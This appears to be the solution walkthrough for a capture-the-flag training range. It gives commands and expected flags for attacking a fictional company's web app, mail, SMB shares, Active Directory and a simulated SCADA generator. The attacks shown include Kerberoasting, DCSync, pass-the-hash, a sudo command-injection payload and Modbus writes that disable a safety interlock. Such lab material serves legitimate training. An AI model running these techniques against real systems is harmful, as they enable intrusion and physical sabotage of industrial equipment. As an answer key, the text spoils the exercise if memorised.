# Flags 7–19: Front Office

> **Start here:** Read [00-range-access-docker.md](00-range-access-docker.md) for how to access the Docker compose range. All commands run FROM INSIDE the Kali container (`sudo docker exec -it a14-kali /bin/bash`).

These flags come from the intranet (A3 at **172.20.10.30**), mail server (A1 at **172.20.10.20**), file share (A4 at **172.20.10.40**), domain controller (A2 at **10.100.0.4**, external VM), and SCADA system (A5 at **172.20.40.10** web:8080 / **172.20.40.10:502** Modbus, scada network VLAN 40). All are live services — connect to them over the network, not via files on disk.

---

## Flag 7 — Creds in Web App Config (Easy, 50pts)

1. Try fetching `/.env` from the intranet: `curl http://intranet.boreas.local/.env`
2. Alternatively try `/config.bak`.
3. The file is a plaintext config with database credentials, the admin password, and a line:
   ```
   API_KEY=FLAG{4f2e8b7a1c6d9035}
   ```

**Expected flag:** `FLAG{4f2e8b7a1c6d9035}`

---

## Flag 8 — Employee Email with Project Hints (Easy, 50pts)

1. Log into the webmail (Roundcube) at `http://mail.boreas.local` as an employee to prove the webmail is reachable. Try `d.kowalski` / `P@ssw0rd123` (found from the config leak on A3 or from A0's employee directory + password guessing).
2. The flag-carrying email lives in **Dr. Vasik's** inbox, not Kowalski's. Roundcube is per-user login, so log out of Kowalski and log back in as `e.vasik` / `Reactor#Core9` (her password is discoverable from the A3 `/search` SQL-injection user-table dump, or via the Project-L hints in Kowalski's own mail). Alternatively, use IMAP directly: `curl --url "imap://mail.boreas.local/INBOX" --user "e.vasik:Reactor#Core9"`.
3. In Vasik's inbox find the email with subject "Re: Locomotion milestone? [with attachment]" (there is a second, plain reply with subject "Re: Locomotion milestone?" — the one you want carries the PDF `project_status_report_oct2025.pdf`).
4. Open the PDF. At the bottom it has a Report ID containing the flag.

**Expected flag:** `FLAG{3b7e9a2d1c8f4063}`

---

## Flag 9 — HR Records / Terminated Engineer (Easy, 50pts)

1. The HR share is restricted to the `hr` and `executives` groups. You need an Executive credential. The A3 intranet HR wiki page leaks the "New employee default password: `Welcome1`" and notes that several employees never changed it — `m.webb` (COO, listed on the A0 leadership page) is one of them. Connect:
   ```
   smbclient //fileserv.boreas.local/HR -U "m.webb%Welcome1"
   ```
   (`d.kowalski` / `P@ssw0rd123` is NOT in executives and will get `NT_STATUS_ACCESS_DENIED` — the IT group is only allowed on the `IT` share.)
2. Navigate to `personnel/`.
3. Download `chen_james_termination.pdf`.
4. The flag is on **page 2** of the PDF, in the "Case Reference Number" field.

**Expected flag:** `FLAG{7a1b3d9e2c8f0546}`

---

## Flag 10 — Password Reuse Gives Mail Access (Easy, 50pts)

1. Log into the webmail as `d.kowalski` with password `P@ssw0rd123`.
   - This password is discoverable from the A0 employee directory (Kowalski is listed) + common password guessing, or from the `.env` config on A3.
2. In Kowalski's inbox, find the first email: "Welcome to your Boreas Systems mailbox" from `postmaster@boreas.local`.
3. The email contains an "Account activation token" which is the flag.

**Expected flag:** `FLAG{e5d1f8c2a7b03946}`

---

## Flag 11 — Cafeteria Menu / Mundane File Share (Easy, 50pts)

1. Connect to the Public share: `smbclient //fileserv.boreas.local/Public -U <username>%<password>`
2. Download `cafeteria_menu_april.pdf`.
3. Check the PDF metadata: `exiftool cafeteria_menu_april.pdf` or `pdfinfo cafeteria_menu_april.pdf`.
4. The **Author** field contains the flag.

**Expected flag:** `FLAG{0e6f9c2d4a8b7135}`

---

## Flag 12 — Internal Wiki / "The Project" (Easy, 50pts)

1. Log into the intranet at `http://intranet.boreas.local/login`. Use any valid credentials (e.g., `d.kowalski` / `P@ssw0rd123`).
2. Browse the wiki. Fetch the **Project Coordination** page at `http://intranet.boreas.local/wiki/project-coordination` (the slug is lowercase and hyphenated — the navigation label reads "Project Coordination" but the URL is `project-coordination`).
3. **View the page source.** The flag is in an HTML comment at the top of the content:
   ```html
   <!-- FLAG{d8a3c5e9f1b07264} -->
   ```

**Expected flag:** `FLAG{d8a3c5e9f1b07264}`

---

## Flag 13 — Procurement Orders / Hydraulic Actuators (Medium, 100pts)

1. The Procurement share is restricted to the `procurement` and `executives` groups. Use the same Executive credential as flag 9 (`m.webb / Welcome1`):
   ```
   smbclient //fileserv.boreas.local/Procurement -U "m.webb%Welcome1"
   ```
2. Download `PO-2847_hydraulic_actuators.pdf`.
3. Read the PO. In the **Special Instructions** field, it references: `specs/actuator_requirements_v4.pdf`.
4. Navigate to the `specs/` subdirectory and download `actuator_requirements_v4.pdf`.
5. The flag is in the document as a "Specification ID."

**Expected flag:** `FLAG{8c5a0d3f7e1b2964}`

---

## Flag 14 — AD Enumeration / Suspicious Accounts (Medium, 100pts)

1. Use LDAP to enumerate the domain:
   ```
   ldapsearch -x -H ldap://dc01.boreas.local -b "DC=boreas,DC=local" -D "d.kowalski@boreas.local" -w "P@ssw0rd123" "(objectClass=group)" cn member
   ```
2. You'll see groups like Lab-Access, SCADA-Admins, Security-Staff. But "Project-L" is **not directly visible** — it's nested.
3. Look at `Engineering-Support` → its member is `Research-Coordination` → its member is `Project-L`.
4. Query the `Project-L` group specifically, requesting the `info` attribute:
   ```
   ldapsearch ... "(cn=Project-L)" info member
   ```
5. The `info` attribute contains the flag.

**Expected flag:** `FLAG{2f8b4a6c1d9e7053}`

---

## Flag 15 — Lateral Movement to Second Host (Medium, 100pts)

1. Log into the webmail as `d.kowalski` / `P@ssw0rd123`.
2. Find the email with subject **"creds backup"** (Kowalski sent it to himself).
3. It contains credentials for the file share service account:
   ```
   Server: fileserv.boreas.local
   User: svc-fileshare
   Pass: F1l3Sh@r3Svc!
   Shares: \\fileserv\IT
   ```
4. Connect to the IT share using these service account credentials:
   ```
   smbclient //fileserv.boreas.local/IT -U "svc-fileshare%F1l3Sh@r3Svc!"
   ```
5. Download `backup_verification.log`.
6. The flag is in the log file as a "Backup verification token."

**Expected flag:** `FLAG{9a4c7e2f58d0b163}`

---

## Flag 16 — Guard Rotation Logs / Unreliable Guard (Medium, 100pts)

1. Access the badge log share on the DC. Any valid domain user works; the
   simplest path (after flag 17's Kerberoast+crack) is
   `svc-backup%Password1`, but any of the AD-reused passwords also works
   (e.g. `e.vasik%Reactor#Core9`):
   ```
   smbclient //dc01.boreas.local/badgelogs -U "svc-backup%Password1"
   ```
2. Download `access_log_march_2026.csv`.
3. Cross-reference Petrov's entries with the guard rotation schedule (from Morrison's email on A1).
4. Petrov accessed the **Underground Hatch** 6 times between 02:00-03:00 AM — outside his scheduled patrol.
5. One of Petrov's log entries has the flag in the status/comment field.

**Expected flag:** `FLAG{b3d7e1f0c8a24596}`

---

## Flag 17 — Privilege Escalation / Domain Admin (Hard, 200pts)

1. Enumerate SPNs in the domain using Impacket:
   ```
   GetUserSPNs.py "BOREAS.LOCAL/d.kowalski:P@ssw0rd123" -dc-ip dc01.boreas.local -request
   ```
2. You get a Kerberos TGS hash for `svc-backup` (and `svc-scada`).
3. Crack the `svc-backup` hash with hashcat or john:
   ```
   hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
   ```
   Password is `Password1` — cracks in seconds.
4. `svc-backup` has misconfigured **DCSync rights** (Replicating Directory Changes). Use secretsdump:
   ```
   secretsdump.py "BOREAS.LOCAL/svc-backup:Password1@dc01.boreas.local" -just-dc-user Administrator
   ```
5. You get the Administrator NTLM hash (the second hex half of
   `Administrator:500:aad3b435b51404eeaad3b435b51404ee:<nt-hash>:::`).
   Administrator's cleartext password is random — use pass-the-hash via
   impacket's smbclient.py:
   ```
   /opt/tools/bin/smbclient.py \
       -hashes aad3b435b51404eeaad3b435b51404ee:<nt-hash-from-secretsdump> \
       BOREAS.LOCAL/Administrator@dc01.boreas.local <<'CMDS'
   use admin_flag
   get flag.txt
   exit
   CMDS
   ```
6. The flag is in `flag.txt`.

**Expected flag:** `FLAG{6c0a9d4e7f2b8135}`

---

## Flag 37 — Ops Engineer Workstation Privilege Escalation (Hard, 200pts)

This flag is the **gate for flags 18 and 19.** A15 (`ops-eng01.boreas.local`, 172.20.10.50) is the only Front Office asset with a network route onto VLAN 40 (SCADA). Without rooting A15 and reading the HMI credential cache, there is no way to reach `scada-gw.boreas.local` and no way to fire the collective gate.

1. **Discover Sergei Ivanov (OSINT).** On the A0 `/leadership.html` page, scroll past the three executives — the "Department Leads" block names Sergei Ivanov as "Operations Engineer — Plant Systems" with email `s.ivanov@boreas-systems.ctf`. Cross-reference with the A4 HR share `org_chart_current.xlsx` (flag 9 path, uses `m.webb / Welcome1`): Ivanov appears as "Ops Engineer — Plant Systems", reports to Webb, note "Generator + SCADA on-call".

2. **Get Ivanov's password.** The A3 intranet HR wiki already tells you that the corporate default is `Welcome1` and that several employees never rotated (same clue that powers flag 9 / flag 10). Confirmation: log into Roundcube at `http://mail.boreas.local` as `s.ivanov` / `Welcome1` — the HR "Welcome back — account reset complete" mail in his inbox explicitly sets the password back to the corporate default on return from leave. The second mail thread in the same inbox (`02_scada_creds_ping.eml` + reply) hints that the SCADA creds live on root's side of A15 under `/root/.scada/`.

3. **SSH into A15 as Ivanov.**
   ```
   sshpass -p Welcome1 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null s.ivanov@ops-eng01.boreas.local
   ```
   Check `.bash_history` and `notes.txt` once inside — both reinforce the sudo chain and the root-side loot location.

4. **Enumerate the sudo rule.**
   ```
   sudo -l
   ```
   Exactly one rule: `s.ivanov ALL=(root) NOPASSWD: /opt/ops/scada_diag.sh`

5. **Exploit the sudo-arg-injection sink.** `/opt/ops/scada_diag.sh` builds `CMD="curl -sS --max-time 5 http://$HOST:8080/ping"` and `eval`s it, so shell metacharacters in the hostname get re-parsed and run as root. The trailing `#` is essential — without it, `eval` sees `curl ... http://x; cat /root/.scada/hmi.json:8080/ping` and cat tries to read the concatenated filename. With the `#`, the `:8080/ping` token becomes a comment and `cat` runs cleanly:
   ```
   sudo /opt/ops/scada_diag.sh --host "x; cat /root/.scada/hmi.json #"
   ```
   The `cat` runs as root and streams the file contents back through the script's output.

6. **Read the loot.** `/root/.scada/hmi.json` contains the SCADA HMI credentials and the flag:
   ```json
   {
     "target": "scada-gw.boreas.local",
     "username": "svc-scada",
     "password": "Sc@da#2025!",
     "flag": "FLAG{5c3e7a9f1b8d4602}",
     ...
   }
   ```

**Expected flag:** `FLAG{5c3e7a9f1b8d4602}`

**Keep the A15 SSH session open.** Flags 18 and 19 both execute from inside this shell — A15 is the only Front Office host that can reach `scada-gw.boreas.local`, and `pymodbus` is preinstalled there.

---

## Flag 18 — SCADA Interface Discovered (Hard, 200pts)

**Prerequisite:** Flag 37 complete — you are sitting in the A15 SSH session as `s.ivanov`.

1. The SCADA HMI hostname is `scada-gw.boreas.local`. If you haven't identified the host yet, it's also listed in the A4 IT share network diagram (flag 19 chain) and in the A3 intranet IT Knowledge Base. The A15 Ops Telemetry dashboard you can curl at `http://ops-eng01.boreas.local/` also names it in its footer text.
2. From inside the A15 shell, fetch the HMI monitoring dashboard:
   ```
   python3 -c "import urllib.request; print(urllib.request.urlopen('http://scada-gw.boreas.local:8080/').read().decode())" | head -80
   ```
3. The monitoring dashboard requires no authentication. Control functions require svc-scada, but the monitoring page is what carries flag 18.
4. The flag is in the **page footer** as "S/N: FLAG{...}".

**Expected flag:** `FLAG{1d4e7b0a3c9f8265}`

---

## Flag 19 — Generator SCADA Override / Collective Gate (Expert, 300pts)

**Prerequisite:** Flag 37 complete — you are sitting in the A15 SSH session as `s.ivanov`, and you have the `svc-scada / Sc@da#2025!` cred from the `hmi.json` loot.

1. Fetch the SCADA HMI architecture page from inside the A15 shell:
   ```
   python3 -c "import urllib.request; print(urllib.request.urlopen('http://scada-gw.boreas.local:8080/architecture').read().decode())"
   ```
   It reveals that a Modbus PLC on port 502 controls the hardware interlock, and that the interlock must be bypassed via raw Modbus before the HMI controls will do anything.
2. The HMI control panel credentials (`svc-scada / Sc@da#2025!`) came from `/root/.scada/hmi.json` in flag 37. No further cred discovery is needed.
3. The maintenance key `7734` is documented in `generator_maintenance_manual.pdf` on the A4 IT share — it's the NV-3200 vendor's bypass procedure for the thermal-loop interlock. You need IT-share read access, which the `svc-fileshare` service account from flag 15 (Kowalski's "creds backup" email on A1) provides. Pull the manual on **Kali** (the A15 shell has no `smbclient`), read the key, then continue in the A15 shell:
   ```
   # from inside a14-kali
   smbclient //fileserv.boreas.local/IT -U "svc-fileshare%F1l3Sh@r3Svc!" -c "get generator_maintenance_manual.pdf"
   pdf2txt.py generator_maintenance_manual.pdf | grep -E '7734|register 100|MAINT_KEY'
   ```
4. Back in the A15 shell, use `pymodbus` (preinstalled on A15) to clear the interlock:
   ```python
   from pymodbus.client import ModbusTcpClient
   c = ModbusTcpClient("scada-gw.boreas.local", port=502)
   c.connect()
   c.write_register(address=200, value=7734)  # maintenance key
   c.write_register(address=100, value=0)      # disable interlock
   ```
5. With the interlock bypassed, set fuel injection to 100% and cooling to 0%:
   ```python
   c.write_register(address=10, value=100)  # fuel 100%
   c.write_register(address=11, value=0)    # cooling 0%
   ```
6. Wait ~12 seconds. The HMI shows temperature climbing to CRITICAL.
7. Fetch the HMI root page from the A15 shell to see the CRITICAL FAILURE screen with the flag:
   ```
   python3 -c "import urllib.request, re; html = urllib.request.urlopen('http://scada-gw.boreas.local:8080/').read().decode(); print(re.search(r'FLAG\{[^}]+\}', html).group(0))"
   ```
8. **This is the collective gate** — narratively, it opens the Bunker for all participants. In this range the `splice-link` network is pre-wired so A9 is already reachable from Kali regardless of gate state; the flag 19 firing is a narrative beat, not a runtime topology change.

**Expected flag:** `FLAG{a7f2c8d0e5b34169}`
